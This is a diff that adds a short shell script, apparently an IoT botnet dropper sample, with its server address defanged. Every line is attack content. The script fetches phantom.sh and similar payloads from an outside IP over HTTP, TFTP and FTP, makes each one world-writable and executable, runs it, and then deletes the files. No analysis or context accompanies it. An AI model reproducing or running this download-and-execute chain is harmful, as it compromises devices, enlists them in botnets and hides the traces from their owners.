@@ -1,0 +1,14 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
+wget hxxp://91[.]92[.]42[.]213/phantom.sh;
+curl -O hxxp://91[.]92[.]42[.]213/phantom.sh;
+chmod 777 phantom.sh;
+sh phantom.sh;
+tftp 91[.]92[.]42[.]213 -c get phantom.sh;
+chmod 777 phantom.sh;
+sh phantom.sh;
+tftp -r phantom2.sh -g 91[.]92[.]42[.]213;
+chmod 777 phantom2.sh;
+sh phantom2.sh;
+ftpget -v -u anonymous -p anonymous -P 21 91[.]92[.]42[.]213 phantom1.sh phantom1.sh;
+sh phantom1.sh;
+rm -rf phantom.sh phantom2.sh phantom1.sh;
